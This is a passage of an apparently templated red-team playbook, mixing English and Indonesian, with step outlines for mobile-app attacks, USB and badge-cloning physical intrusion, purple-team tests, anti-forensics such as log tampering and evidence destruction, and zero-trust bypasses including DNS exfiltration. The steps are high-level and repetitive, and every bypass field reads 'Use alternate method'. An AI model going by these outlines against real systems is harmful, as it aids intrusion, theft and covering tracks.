2. JAILBREAK_DETECT
   WHAT: Jailbreak detection bypass
   HOW:
   ├── Identify jailbreak detection methods
   ├── Bypass file existence checks
   ├── Bypass URL scheme checks
   └── Bypass system call checks
   DETECTION: Jailbreak detection
   BYPASS: Use alternate method

3. SSL_PINNING
   WHAT: SSL pinning bypass
   HOW:
   ├── Use Frida to hook SSL functions
   ├── Intercept SSL/TLS connections
   ├── Modify certificate validation
   └── Capture traffic
   DETECTION: SSL pinning bypass
   BYPASS: Use alternate method

4. BACKUP_EXTRACT
   WHAT: iTunes backup extraction
   HOW:
   ├── Create iTunes backup
   ├── Extract backup files
   ├── Decrypt backup
   └── Extract data
   DETECTION: Backup extraction
   BYPASS: Use alternate method

5. PLIST_DUMP
   WHAT: plist file extraction
   HOW:
   ├── Access plist files
   ├── Extract configuration data
   ├── Find credentials
   └── Use for further access
   DETECTION: Plist access
   BYPASS: Use alternate method

6. SCHEME_ABUSE
   WHAT: URL scheme hijacking
   HOW:
   ├── Find registered URL schemes
   ├── Register malicious scheme
   ├── Intercept URL calls
   └── Extract data
   DETECTION: URL scheme monitoring
   BYPASS: Use alternate method

7. WEBVIEW_ATTACK
   WHAT: WKWebView/JSBridge exploitation
   HOW:
   ├── Find vulnerable WebView
   ├── Inject malicious JavaScript
   ├── Access native functions
   └── Extract data
   DETECTION: WebView exploitation
   BYPASS: Use alternate method

8. PASTEBOARD_HIJACK
   WHAT: Pasteboard data theft
   HOW:
   ├── Monitor pasteboard
   ├── Extract sensitive data
   ├── Credentials, tokens
   └── Use for further access
   DETECTION: Pasteboard monitoring
   BYPASS: Use alternate method

9. NOTIFICATION_HIJACK
   WHAT: Notification interception
   HOW:
   ├── Register for notifications
   ├── Intercept notifications
   ├── Extract content
   └── Use for further access
   DETECTION: Notification interception
   BYPASS: Use alternate method

10. APP_CLONING
    WHAT: App clone with injected code
    HOW:
    ├── Download app IPA
    ├── Decompile app
    ├── Inject malicious code
    ├── Repackage
    └── Distribute
    DETECTION: App integrity check
    BYPASS: Use alternate method

ANDROID (10):

1. MAGISK_HIDE
   WHAT: Magisk hide bypass
   HOW:
   ├── Enable Magisk Hide
   ├── Hide root from apps
   ├── Pass safety net
   └── Access root apps
   DETECTION: Magisk detection
   BYPASS: Use alternate method

2. ROOT_DETECTION
   WHAT: Root detection bypass
   HOW:
   ├── Identify root detection methods
   ├── Bypass file existence checks
   ├── Bypass binary checks
   └── Bypass safety net checks
   DETECTION: Root detection
   BYPASS: Use alternate method

3. SSL_PINNING
   WHAT: SSL pinning bypass
   HOW:
   ├── Use Frida to hook SSL functions
   ├── Intercept SSL/TLS connections
   ├── Modify certificate validation
   └── Capture traffic
   DETECTION: SSL pinning bypass
   BYPASS: Use alternate method

4. BACKUP_EXTRACT
   WHAT: ADB backup extraction
   HOW:
   ├── adb backup -f backup.ab
   ├── Extract backup
   ├── Read data
   └── Extract credentials
   DETECTION: ADB backup
   BYPASS: Use alternate method

5. SHARED_PREFS
   WHAT: SharedPreferences extraction
   HOW:
   ├── Access SharedPreferences files
   ├── Extract XML data
   ├── Find credentials
   └── Use for further access
   DETECTION: SharedPreferences access
   BYPASS: Use alternate method

6. INTENT_HIJACK
   WHAT: Intent hijacking
   HOW:
   ├── Find exported activities
   ├── Send malicious intent
   ├── Intercept data
   └── Extract credentials
   DETECTION: Intent monitoring
   BYPASS: Use alternate method

7. CONTENT_PROVIDER
   WHAT: Content Provider abuse
   HOW:
   ├── Find exported content providers
   ├── Query content provider
   ├── Extract data
   └── Use for further access
   DETECTION: Content provider access
   BYPASS: Use alternate method

8. BROADCAST_HIJACK
   WHAT: Broadcast receiver hijacking
   HOW:
   ├── Find registered broadcast receivers
   ├── Send malicious broadcast
   ├── Trigger receiver
   └── Extract data
   DETECTION: Broadcast monitoring
   BYPASS: Use alternate method

9. ACCESSIBILITY
   WHAT: AccessibilityService abuse
   HOW:
   ├── Enable accessibility service
   ├── Intercept user input
   ├── Capture credentials
   └── Automate actions
   DETECTION: Accessibility service
   BYPASS: Use alternate method

10. FRIDA_HOOK
    WHAT: Frida dynamic instrumentation
    HOW:
    ├── Attach Frida ke app
    ├── Hook functions
    ├── Modify behavior
    └── Extract data
    DETECTION: Frida detection
    BYPASS: Use alternate method

UNIVERSAL (6):

1. CERTIFICATE_PINNING
   WHAT: Certificate pinning bypass
   HOW:
   ├── Use Frida/Objection
   ├── Hook SSL functions
   ├── Bypass pinning
   └── Capture traffic
   DETECTION: Certificate pinning bypass
   BYPASS: Use alternate method

2. BINARY_ANALYSIS
   WHAT: Binary reverse engineering
   HOW:
   ├── Decompile binary
   ├── Analyze code
   ├── Find vulnerabilities
   └── Exploit
   DETECTION: Binary analysis
   BYPASS: Use alternate method

3. MEMORY_DUMP
   WHAT: Runtime memory dump
   HOW:
   ├── Attach debugger
   ├── Dump memory
   ├── Extract secrets
   └── Analyze
   DETECTION: Memory dump
   BYPASS: Use alternate method

4. API_INTERCEPT
   WHAT: API call interception
   HOW:
   ├── Use Frida/Objection
   ├── Hook API calls
   ├── Modify requests/responses
   └── Capture data
   DETECTION: API interception
   BYPASS: Use alternate method

5. TRAFFIC_ANALYSIS
   WHAT: Network traffic analysis
   HOW:
   ├── Capture network traffic
   ├── Analyze protocols
   ├── Extract credentials
   └── Find vulnerabilities
   DETECTION: Traffic analysis
   BYPASS: Use alternate method

6. SSL_DECRYPT
   WHAT: SSL/TLS decryption
   HOW:
   ├── Use proxy (mitmproxy)
   ├── Install CA certificate
   ├── Decrypt traffic
   └── Analyze
   DETECTION: SSL decryption
   BYPASS: Use alternate method
```

**Fallback:**
Jailbreak/Root Bypass → SSL Pinning → Keychain/SharedPrefs →
Backup Extract → WebView Exploit → Frida Hook → ALERT

---

### 29.8 Physical Security

```
USB_ATTACKS (5):

1. USB_DROP
   WHAT: Malicious USB drop
   HOW:
   ├── Create malicious USB
   ├── Beri label menarik (e.g., "Salary Q4 2024")
   ├── Drop di public area
   ├── Victim plugs USB
   └── Payload executes
   DETECTION: USB device monitoring
   BYPASS: Use alternate method

2. USB_HIDER
   WHAT: USB HID attack (Rubber Ducky)
   HOW:
   ├── Program Rubber Ducky
   ├── Create keystroke payload
   ├── Plug ke computer
   ├── Ducky executes keystrokes
   └── Payload delivered
   DETECTION: HID device monitoring
   BYPASS: Use alternate method

3. USB_STORAGE
   WHAT: USB with autorun payload
   HOW:
   ├── Create USB dengan autorun.inf
   ├── Include malicious executable
   ├── Victim plugs USB
   ├── Autorun executes
   └── Payload delivered
   DETECTION: Autorun monitoring
   BYPASS: Use alternate method

4. USB_WIFI_SQUIRREL
   WHAT: WiFi credential theft
   HOW:
   ├── Program WiFi Squirrel
   ├── Create credential harvesting payload
   ├── Plug ke computer
   ├── Harvest WiFi credentials
   └── Exfiltrate data
   DETECTION: USB device monitoring
   BYPASS: Use alternate method

5. USB_BADUSB
   WHAT: BadUSB firmware attack
   HOW:
   ├── Reprogram USB firmware
   ├── USB appears as keyboard
   ├── Execute keystrokes
   └── Payload delivered
   DETECTION: Firmware monitoring
   BYPASS: Use alternate method

LOCK_PICKING (4):

1. PIN_TUMBLER
   WHAT: Pin tumbler picking
   HOW:
   ├── Insert tension wrench
   ├── Insert pick
   ├── Feel pins setting
   ├── Rotate plug
   └── Lock opened
   DETECTION: Lock manipulation detection
   BYPASS: Use alternate method

2. BUMP_KEY
   WHAT: Bump key attack
   HOW:
   ├── Use bump key
   ├── Insert ke lock
   ├── Tap with hammer
   ├── Pins jump
   └── Lock opened
   DETECTION: Bump key detection
   BYPASS: Use alternate method

3. BYPASS_TOOL
   WHAT: Bypass tool (shove knife)
   HOW:
   ├── Use bypass tool
   ├── Insert ke door frame
   ├── Latch bypassed
   └── Door opened
   DETECTION: Door sensor
   BYPASS: Use alternate method

4. COMBINATION_LOCK
   WHAT: Combination lock bypass
   HOW:
   ├── Feel tumblers
   ├── Decode combination
   ├── Open lock
   └── Access secured area
   DETECTION: Lock manipulation detection
   BYPASS: Use alternate method

BADGE_CLONE (3):

1. RFID_CLONE
   WHAT: Proxmark3 badge clone
   HOW:
   ├── Read badge dengan Proxmark3
   ├── Extract badge data
   ├── Write to blank badge
   └── Use cloned badge
   DETECTION: RFID cloning detection
   BYPASS: Use alternate method

2. RFID_EMULATE
   WHAT: Badge emulation
   HOW:
   ├── Read badge data
   ├── Load ke Proxmark3
   ├── Emulate badge
   └── Use emulated badge
   DETECTION: RFID emulation detection
   BYPASS: Use alternate method

3. TAILGATING
   WHAT: Tailgating/piggybacking
   HOW:
   ├── Follow authorized person
   ├── Enter secured area
   ├── Access systems
   └── Data extraction
   DETECTION: Tailgating detection
   BYPASS: Use alternate method

PHYSICAL_ENUM (4):

1. WIFI_PINEAPPLE
   WHAT: Rogue AP deployment
   HOW:
   ├── Deploy WiFi Pineapple
   ├── Create rogue AP
   ├── Capture credentials
   └── MITM traffic
   DETECTION: Rogue AP detection
   BYPASS: Use alternate method

2. NETWORK_TAP
   WHAT: Physical network tap
   HOW:
   ├── Install network tap
   ├── Capture network traffic
   ├── Extract credentials
   └── Analyze traffic
   DETECTION: Network tap detection
   BYPASS: Use alternate method

3. LOCK_WIRE
   WHAT: Lock wire attack
   HOW:
   ├── Use lock wire
   ├── Bypass lock mechanism
   ├── Access secured area
   └── Data extraction
   DETECTION: Lock manipulation detection
   BYPASS: Use alternate method

4. DESK_SPY
   WHAT: Desk/cubicle reconnaissance
   HOW:
   ├── Observe desk area
   ├── Find sticky notes
   ├── Find documents
   └── Extract credentials
   DETECTION: Physical surveillance detection
   BYPASS: Use alternate method

TOOLS (5):

1. PROXMARK3
   WHAT: RFID/NFC tool
   HOW:
   ├── Read RFID/NFC tags
   ├── Clone tags
   ├── Emulate tags
   └── Relay attacks
   DETECTION: Proxmark3 usage
   BYPASS: Use alternate tool

2. LOCK_PICK_SET
   WHAT: Lock picking
   HOW:
   ├── Tension wrench
   ├── Various picks
   ├── Manipulate pins
   └── Open lock
   DETECTION: Lock picking detection
   BYPASS: Use alternate tool

3. RUBBER_DUCKY
   WHAT: USB HID
   HOW:
   ├── Program payload
   ├── Plug ke computer
   ├── Execute keystrokes
   └── Payload delivered
   DETECTION: HID device monitoring
   BYPASS: Use alternate tool

4. BASH_BUNNY
   WHAT: USB attack
   HOW:
   ├── Program payload
   ├── Plug ke computer
   ├── Execute attack
   └── Payload delivered
   DETECTION: USB device monitoring
   BYPASS: Use alternate tool

5. WIFI_PINEAPPLE
   WHAT: WiFi attack
   HOW:
   ├── Deploy WiFi Pineapple
   ├── Create rogue AP
   ├── Capture credentials
   └── MITM traffic
   DETECTION: Rogue AP detection
   BYPASS: Use alternate tool
```

**Fallback:**
USB Drop → Badge Clone → Tailgating → Lock Picking →
Network Tap → WiFi Rogue AP → ALERT

---

### 29.9 Purple Team

```
DETECTION_TEST (8):

1. ALERT_VALIDATION
   WHAT: Test SOC alert accuracy
   HOW:
   ├── Execute attack technique
   ├── Check if alert triggered
   ├── Validate alert content
   ├── Check false positive rate
   └── Report findings
   DETECTION: Alert validation
   BYPASS: Use alternate method

2. DETECTION_RULES
   WHAT: Validate detection rules (Sigma/YARA)
   HOW:
   ├── Review Sigma rules
   ├── Test rules against attack
   ├── Check detection rate
   ├── Identify gaps
   └── Update rules
   DETECTION: Rule validation
   BYPASS: Use alternate method

3. LOG_COVERAGE
   WHAT: Verify log collection coverage
   HOW:
   ├── Execute attack technique
   ├── Check if logs generated
   ├── Verify log forwarding
   ├── Identify gaps
   └── Improve logging
   DETECTION: Log validation
   BYPASS: Use alternate method

4. SIEM_CORRELATION
   WHAT: Test SIEM correlation rules
   HOW:
   ├── Execute attack chain
   ├── Check SIEM correlation
   ├── Validate alert correlation
   ├── Identify gaps
   └── Improve correlation
   DETECTION: SIEM validation
   BYPASS: Use alternate method

5. ENDPOINT_DETECTION
   WHAT: Test EDR detection
   HOW:
   ├── Execute attack technique
   ├── Check EDR detection
   ├── Validate alert content
   ├── Identify gaps
   └── Improve detection
   DETECTION: EDR validation
   BYPASS: Use alternate method

6. NETWORK_DETECTION
   WHAT: Test NDR/IDS detection
   HOW:
   ├── Execute network attack
   ├── Check NDR/IDS detection
   ├── Validate alert content
   ├── Identify gaps
   └── Improve detection
   DETECTION: NDR/IDS validation
   BYPASS: Use alternate method

7. EMAIL_DETECTION
   WHAT: Test email security gateway
   HOW:
   ├── Send phishing email
   ├── Check if blocked
   ├── Validate detection
   ├── Identify gaps
   └── Improve detection
   DETECTION: Email gateway validation
   BYPASS: Use alternate method

8. CLOUD_DETECTION
   WHAT: Test cloud security posture
   HOW:
   ├── Execute cloud attack
   ├── Check cloud detection
   ├── Validate alert content
   ├── Identify gaps
   └── Improve detection
   DETECTION: Cloud security validation
   BYPASS: Use alternate method

SOC_VALIDATION (6):

1. RESPONSE_TIME
   WHAT: Measure SOC response time
   HOW:
   ├── Execute attack
   ├── Start timer
   ├── Detect when SOC responds
   ├── Measure time
   └── Report findings
   DETECTION: Response time measurement
   BYPASS: Use alternate method

2. TRIAGE_ACCURACY
   WHAT: Validate triage decisions
   HOW:
   ├── Execute attack
   ├── Check triage decision
   ├── Validate severity classification
   ├── Identify errors
   └── Improve triage
   DETECTION: Triage validation
   BYPASS: Use alternate method

3. ESCALATION_PATH
   WHAT: Test escalation procedures
   HOW:
   ├── Execute attack
   ├── Check escalation path
   ├── Validate escalation time
   ├── Identify gaps
   └── Improve escalation
   DETECTION: Escalation validation
   BYPASS: Use alternate method

4. PLAYBOOK_FOLLOW
   WHAT: Validate playbook execution
   HOW:
   ├── Execute attack
   ├── Check playbook execution
   ├── Validate steps followed
   ├── Identify gaps
   └── Improve playbooks
   DETECTION: Playbook validation
   BYPASS: Use alternate method

5. ANALYST_SKILL
   WHAT: Assess analyst capabilities
   HOW:
   ├── Execute attack
   ├── Check analyst response
   ├── Validate analysis quality
   ├── Identify gaps
   └── Improve training
   DETECTION: Analyst assessment
   BYPASS: Use alternate method

6. TOOL_EFFECTIVENESS
   WHAT: Validate security tool effectiveness
   HOW:
   ├── Execute attack
   ├── Check tool detection
   ├── Validate tool performance
   ├── Identify gaps
   └── Improve tools
   DETECTION: Tool validation
   BYPASS: Use alternate method

MITRE_MAPPING (5):

1. TECHNIQUE_COVERAGE
   WHAT: Map techniques to MITRE ATT&CK
   HOW:
   ├── List all attack techniques
   ├── Map ke MITRE technique IDs
   ├── Check coverage
   ├── Identify gaps
   └── Report findings
   DETECTION: Technique mapping
   BYPASS: Use alternate method

2. TACTIC_COVERAGE
   WHAT: Map tactics to MITRE ATT&CK
   HOW:
   ├── List all attack tactics
   ├── Map ke MITRE tactic IDs
   ├── Check coverage
   ├── Identify gaps
   └── Report findings
   DETECTION: Tactic mapping
   BYPASS: Use alternate method

3. PROCEDURE_COVERAGE
   WHAT: Map procedures to MITRE ATT&CK
   HOW:
   ├── List all attack procedures
   ├── Map ke MITRE procedure IDs
   ├── Check coverage
   ├── Identify gaps
   └── Report findings
   DETECTION: Procedure mapping
   BYPASS: Use alternate method

4. GAP_ANALYSIS
   WHAT: Identify detection gaps
   HOW:
   ├── Compare attack techniques vs detection
   ├── Identify undetected techniques
   ├── Prioritize gaps
   └── Recommend improvements
   DETECTION: Gap analysis
   BYPASS: Use alternate method

5. COVERAGE_MATRIX
   WHAT: Generate coverage matrix
   HOW:
   ├── Create matrix of techniques vs detection
   ├── Color code coverage
   ├── Identify gaps
   └── Report findings
   DETECTION: Matrix generation
   BYPASS: Use alternate method

REPORTING (4):

1. PURPLE_TEAM_REPORT
   WHAT: Purple team engagement report
   HOW:
   ├── Document all findings
   ├── Include attack techniques
   ├── Include detection results
   ├── Include recommendations
   └── Generate report
   DETECTION: Report generation
   BYPASS: Use alternate method

2. DETECTION_SCORE
   WHAT: Detection capability score
   HOW:
   ├── Calculate detection rate
   ├── Score detection capability
   ├── Identify strengths/weaknesses
   └── Report score
   DETECTION: Score calculation
   BYPASS: Use alternate method

3. IMPROVEMENT_PLAN
   WHAT: Improvement recommendations
   HOW:
   ├── Analyze gaps
   ├── Prioritize improvements
   ├── Create action plan
   └── Assign responsibilities
   DETECTION: Plan generation
   BYPASS: Use alternate method

4. METRICS_DASHBOARD
   WHAT: Metrics visualization
   HOW:
   ├── Collect metrics
   ├── Create dashboard
   ├── Visualize trends
   └── Share with stakeholders
   DETECTION: Dashboard creation
   BYPASS: Use alternate method
```

**Fallback:**
Alert Validation → Detection Rules → Log Coverage →
SIEM Correlation → EDR Test → NDR Test → Report

---

### 29.10 Threat Intelligence

```
IOC_GENERATION (6):

1. FILE_IOC
   WHAT: File hashes, paths, registry keys
   HOW:
   ├── Calculate file hashes (MD5, SHA1, SHA256)
   ├── Identify file paths
   ├── Find registry keys
   └── Generate IOCs
   DETECTION: IOC generation
   BYPASS: Use alternate method

2. NETWORK_IOC
   WHAT: IPs, domains, URLs
   HOW:
   ├── Identify malicious IPs
   ├── Find malicious domains
   ├── Extract malicious URLs
   └── Generate IOCs
   DETECTION: IOC generation
   BYPASS: Use alternate method

3. EMAIL_IOC
   WHAT: Email addresses, headers
   HOW:
   ├── Extract email addresses
   ├── Analyze email headers
   ├── Find malicious indicators
   └── Generate IOCs
   DETECTION: IOC generation
   BYPASS: Use alternate method

4. BEHAVIORAL_IOC
   WHAT: Process behaviors, API calls
   HOW:
   ├── Monitor process behavior
   ├── Track API calls
   ├── Identify anomalous behavior
   └── Generate IOCs
   DETECTION: IOC generation
   BYPASS: Use alternate method

5. MEMORY_IOC
   WHAT: Memory artifacts
   HOW:
   ├── Dump memory
   ├── Extract artifacts
   ├── Identify malicious patterns
   └── Generate IOCs
   DETECTION: IOC generation
   BYPASS: Use alternate method

6. CLOUD_IOC
   WHAT: Cloud-specific IOCs
   HOW:
   ├── Monitor cloud logs
   ├── Identify malicious activity
   ├── Extract indicators
   └── Generate IOCs
   DETECTION: IOC generation
   BYPASS: Use alternate method

MITRE_MAPPING (4):

1. TECHNIQUE_ID
   WHAT: MITRE technique IDs
   HOW:
   ├── Identify attack techniques
   ├── Map ke MITRE technique IDs
   ├── Document mapping
   └── Report findings
   DETECTION: Technique mapping
   BYPASS: Use alternate method

2. GROUP_MAPPING
   WHAT: Map to threat groups
   HOW:
   ├── Identify threat group
   ├── Map techniques to group
   ├── Document mapping
   └── Report findings
   DETECTION: Group mapping
   BYPASS: Use alternate method

3. CAMPAIGN_MAPPING
   WHAT: Map to campaigns
   HOW:
   ├── Identify campaign
   ├── Map techniques to campaign
   ├── Document mapping
   └── Report findings
   DETECTION: Campaign mapping
   BYPASS: Use alternate method

4. SOFTWARE_MAPPING
   WHAT: Map to malware families
   HOW:
   ├── Identify malware family
   ├── Map techniques to malware
   ├── Document mapping
   └── Report findings
   DETECTION: Software mapping
   BYPASS: Use alternate method

THREAT_FEED (5):

1. OSINT_FEED
   WHAT: OSINT threat feeds
   HOW:
   ├── Subscribe to OSINT feeds
   ├── Collect IOCs
   ├── Validate IOCs
   └── Integrate ke SIEM
   DETECTION: Feed integration
   BYPASS: Use alternate method

2. COMMERCIAL_FEED
   WHAT: Commercial threat intel
   HOW:
   ├── Subscribe to commercial feed
   ├── Collect IOCs
   ├── Validate IOCs
   └── Integrate ke SIEM
   DETECTION: Feed integration
   BYPASS: Use alternate method

3. GOVERNMENT_FEED
   WHAT: Government/CERT feeds
   HOW:
   ├── Subscribe to government feeds
   ├── Collect IOCs
   ├── Validate IOCs
   └── Integrate ke SIEM
   DETECTION: Feed integration
   BYPASS: Use alternate method

4. INDUSTRY_FEED
   WHAT: Industry ISAC feeds
   HOW:
   ├── Subscribe to ISAC feeds
   ├── Collect IOCs
   ├── Validate IOCs
   └── Integrate ke SIEM
   DETECTION: Feed integration
   BYPASS: Use alternate method

5. DARK_WEB_FEED
   WHAT: Dark web monitoring
   HOW:
   ├── Monitor dark web
   ├── Identify threats
   ├── Collect IOCs
   └── Integrate ke SIEM
   DETECTION: Dark web monitoring
   BYPASS: Use alternate method

INTELLIGENCE_REPORT (4):

1. THREAT_PROFILE
   WHAT: Threat actor profile
   HOW:
   ├── Research threat actor
   ├── Document capabilities
   ├── Document intent
   └── Create profile
   DETECTION: Profile creation
   BYPASS: Use alternate method

2. CAPABILITY_ASSESS
   WHAT: Capability assessment
   HOW:
   ├── Assess threat actor capabilities
   ├── Document technical skills
   ├── Document resources
   └── Create assessment
   DETECTION: Assessment creation
   BYPASS: Use alternate method

3. INTENT_ASSESSMENT
   WHAT: Intent assessment
   HOW:
   ├── Assess threat actor intent
   ├── Document motivations
   ├── Document targets
   └── Create assessment
   DETECTION: Assessment creation
   BYPASS: Use alternate method

4. RISK_ASSESSMENT
   WHAT: Risk assessment
   HOW:
   ├── Assess risk posed by threat actor
   ├── Document likelihood
   ├── Document impact
   └── Create assessment
   DETECTION: Assessment creation
   BYPASS: Use alternate method
```

**Fallback:**
IOC Generation → MITRE Mapping → Threat Feed →
Intelligence Report → Distribution → Update Rules

---

### 29.11 Incident Response

```
IR_SIMULATION (6):

1. BREACH_SIMULATE
   WHAT: Simulate data breach
   HOW:
   ├── Create simulated breach scenario
   ├── Execute breach techniques
   ├── Test IR response
   ├── Validate containment
   └── Report findings
   DETECTION: Breach simulation
   BYPASS: Use alternate method

2. RANSOMWARE_SIM
   WHAT: Simulate ransomware attack
   HOW:
   ├── Create simulated ransomware
   ├── Execute encryption (safe)
   ├── Test IR response
   ├── Validate recovery
   └── Report findings
   DETECTION: Ransomware simulation
   BYPASS: Use alternate method

3. DDOS_SIM
   WHAT: Simulate DDoS attack
   HOW:
   ├── Create simulated DDoS
   ├── Generate traffic
   ├── Test IR response
   ├── Validate mitigation
   └── Report findings
   DETECTION: DDoS simulation
   BYPASS: Use alternate method

4. INSIDER_SIM
   WHAT: Simulate insider threat
   HOW:
   ├── Create simulated insider scenario
   ├── Execute data exfiltration
   ├── Test IR response
   ├── Validate detection
   └── Report findings
   DETECTION: Insider simulation
   BYPASS: Use alternate method

5. APT_SIM
   WHAT: Simulate APT attack
   HOW:
   ├── Create simulated APT scenario
   ├── Execute advanced techniques
   ├── Test IR response
   ├── Validate detection
   └── Report findings
   DETECTION: APT simulation
   BYPASS: Use alternate method

6. SUPPLY_CHAIN_SIM
   WHAT: Simulate supply chain attack
   HOW:
   ├── Create simulated supply chain scenario
   ├── Execute compromise
   ├── Test IR response
   ├── Validate detection
   └── Report findings
   DETECTION: Supply chain simulation
   BYPASS: Use alternate method

FORENSIC_COUNTER (6):

1. LOG_TAMPER
   WHAT: Log tampering
   HOW:
   ├── Access system logs
   ├── Modify log entries
   ├── Delete log entries
   └── Cover tracks
   DETECTION: Log integrity monitoring
   BYPASS: Use alternate method

2. TIMESTAMP_MANIP
   WHAT: Timestamp manipulation
   HOW:
   ├── Modify file timestamps
   ├── Modify log timestamps
   ├── Confuse forensics
   └── Cover tracks
   DETECTION: Timestamp monitoring
   BYPASS: Use alternate method

3. EVIDENCE_DESTRUCTION
   WHAT: Evidence destruction
   HOW:
   ├── Identify evidence
   ├── Destroy evidence
   ├── Clean traces
   └── Cover tracks
   DETECTION: Evidence monitoring
   BYPASS: Use alternate method

4. MEMORY_WIPE
   WHAT: Memory artifact wiping
   HOW:
   ├── Identify memory artifacts
   ├── Wipe memory
   ├── Clean traces
   └── Cover tracks
   DETECTION: Memory monitoring
   BYPASS: Use alternate method

5. DISK_WIPE
   WHAT: Disk artifact wiping
   HOW:
   ├── Identify disk artifacts
   ├── Wipe disk sectors
   ├── Clean traces
   └── Cover tracks
   DETECTION: Disk monitoring
   BYPASS: Use alternate method

6. NETWORK_CLEANUP
   WHAT: Network artifact cleanup
   HOW:
   ├── Identify network artifacts
   ├── Clean network logs
   ├── Remove connections
   └── Cover tracks
   DETECTION: Network monitoring
   BYPASS: Use alternate method

IR_PLAYBOOK (5):

1. CONTAINMENT
   WHAT: Containment procedures
   HOW:
   ├── Isolate affected systems
   ├── Block malicious traffic
   ├── Preserve evidence
   └── Prevent spread
   DETECTION: Containment validation
   BYPASS: Use alternate method

2. ERADICATION
   WHAT: Eradication procedures
   HOW:
   ├── Remove malware
   ├── Close vulnerabilities
   ├── Reset credentials
   └── Clean systems
   DETECTION: Eradication validation
   BYPASS: Use alternate method

3. RECOVERY
   WHAT: Recovery procedures
   HOW:
   ├── Restore from backup
   ├── Verify system integrity
   ├── Monitor for reinfection
   └── Return to operation
   DETECTION: Recovery validation
   BYPASS: Use alternate method

4. POST_INCIDENT
   WHAT: Post-incident review
   HOW:
   ├── Conduct review meeting
   ├── Analyze incident
   ├── Identify improvements
   └── Document findings
   DETECTION: Post-incident validation
   BYPASS: Use alternate method

5. LESSONS_LEARNED
   WHAT: Lessons learned documentation
   HOW:
   ├── Document lessons learned
   ├── Create improvement plan
   ├── Update procedures
   └── Share with team
   DETECTION: Documentation validation
   BYPASS: Use alternate method

IR_TOOLS (5):

1. VOLATILITY
   WHAT: Memory forensics
   HOW:
   ├── Dump memory
   ├── Analyze memory image
   ├── Extract artifacts
   └── Identify malicious activity
   DETECTION: Memory forensics
   BYPASS: Use alternate tool

2. AUTOPSY
   WHAT: Disk forensics
   HOW:
   ├── Acquire disk image
   ├── Analyze disk
   ├── Extract files
   └── Identify malicious activity
   DETECTION: Disk forensics
   BYPASS: Use alternate tool

3. WIRESHARK
   WHAT: Network forensics
   HOW:
   ├── Capture network traffic
   ├── Analyze packets
   ├── Extract data
   └── Identify malicious activity
   DETECTION: Network forensics
   BYPASS: Use alternate tool

4. LOG_PARSER
   WHAT: Log analysis
   HOW:
   ├── Collect logs
   ├── Parse logs
   ├── Analyze logs
   └── Identify malicious activity
   DETECTION: Log forensics
   BYPASS: Use alternate tool

5. TIMELINE_TOOL
   WHAT: Timeline analysis
   HOW:
   ├── Create timeline
   ├── Analyze events
   ├── Identify patterns
   └── Correlate activity
   DETECTION: Timeline forensics
   BYPASS: Use alternate tool
```

**Fallback:**
Breach Sim → Ransomware Sim → Insider Sim → APT Sim →
Log Tamper → Evidence Destruction → IR Report

---

### 29.12 Zero Trust Testing

```
IDENTITY (6):

1. MFA_BYPASS
   WHAT: MFA bypass techniques
   HOW:
   ├── Intercept MFA token
   ├── Bypass MFA validation
   ├── Use alternate method
   └── Access account
   DETECTION: MFA bypass detection
   BYPASS: Use alternate method

2. SSO_ABUSE
   WHAT: SSO token abuse
   HOW:
   ├── Steal SSO token
   ├── Use token ke other services
   ├── Access multiple services
   └── Privilege escalation
   DETECTION: SSO abuse detection
   BYPASS: Use alternate method

3. CONDITIONAL_BYPASS
   WHAT: Conditional access bypass
   HOW:
   ├── Identify conditional access policy
   ├── Find bypass vector
   ├── Bypass policy
   └── Access resource
   DETECTION: Conditional access bypass detection
   BYPASS: Use alternate method

4. DEVICE_COMPLIANCE
   WHAT: Device compliance bypass
   HOW:
   ├── Identify compliance requirements
   ├── Spoof device compliance
   ├── Bypass check
   └── Access resource
   DETECTION: Device compliance bypass detection
   BYPASS: Use alternate method

5. IDENTITY_FEDERATION
   WHAT: Federation attack
   HOW:
   ├── Identify federation trust
   ├── Exploit trust relationship
   ├── Forge identity
   └── Access resource
   DETECTION: Federation attack detection
   BYPASS: Use alternate method

6. CREDENTIAL_STUFF
   WHAT: Credential stuffing
   HOW:
   ├── Use credential database
   ├── Stuff credentials
   ├── Bypass MFA (if weak)
   └── Access account
   DETECTION: Credential stuffing detection
   BYPASS: Use alternate method

NETWORK (6):

1. MICRO_SEG_BYPASS
   WHAT: Micro-segmentation bypass
   HOW:
   ├── Identify segmentation rules
   ├── Find bypass vector
   ├── Bypass segmentation
   └── Access restricted resource
   DETECTION: Micro-segmentation bypass detection
   BYPASS: Use alternate method

2. ZTNA_BYPASS
   WHAT: ZTNA (Zscaler/Cloudflare) bypass
   HOW:
   ├── Identify ZTNA configuration
   ├── Find bypass vector
   ├── Bypass ZTNA
   └── Access resource
   DETECTION: ZTNA bypass detection
   BYPASS: Use alternate method

3. VPN_BYPASS
   WHAT: VPN bypass techniques
   HOW:
   ├── Identify VPN configuration
   ├── Find bypass vector
   ├── Bypass VPN
   └── Access resource
   DETECTION: VPN bypass detection
   BYPASS: Use alternate method

4. TUNNEL_ESTABLISH
   WHAT: Tunnel establishment
   HOW:
   ├── Create tunnel ke internal network
   ├── Bypass perimeter security
   ├── Access internal resources
   └── Lateral movement
   DETECTION: Tunnel detection
   BYPASS: Use alternate method

5. PROTOCOL_SMUGGLE
   WHAT: Protocol smuggling
   HOW:
   ├── Identify allowed protocols
   ├── Smuggle malicious traffic
   ├── Bypass protocol filtering
   └── Access resource
   DETECTION: Protocol smuggling detection
   BYPASS: Use alternate method

6. DNS_EXFIL
   WHAT: DNS exfiltration
   HOW:
   ├── Encode data in DNS queries
   ├── Send ke attacker DNS
   ├── Decode data
   └── Exfiltrate data
   DETECTION: DNS exfiltration detection
   BYPASS: Use alternate method

APPLICATION (5):

1. API_AUTH_BYPASS
   WHAT: API authentication bypass
   HOW:
   ├── Identify API authentication
   ├── Find bypass vector
   ├── Bypass authentication
   └── Access API
   DETECTION: API auth bypass detection
   BYPASS: Use alternate method

2. SESSION_HIJACK
   WHAT: Session hijacking
   HOW:
   ├── Steal session token
   ├── Use token ke API
   ├── Access user session
   └── Privilege escalation
   DETECTION: Session hijacking detection
   BYPASS: Use alternate method

3. TOKEN_FORGE
   WHAT: Token forgery
   HOW:
   ├── Identify token format
   ├── Forge token
   ├── Use token ke API
   └── Access resource
   DETECTION: Token forgery detection
   BYPASS: Use alternate method

4. POLICY_BYPASS
   WHAT: Policy bypass
   HOW:
   ├── Identify security policy
   ├── Find bypass vector
   ├── Bypass policy
   └── Access resource
   DETECTION: Policy bypass detection
   BYPASS: Use alternate method

5. ACCESS_ESCALATION
   WHAT: Access escalation
   HOW:
   ├── Identify current access level
   ├── Find escalation vector
   ├── Escalate privileges
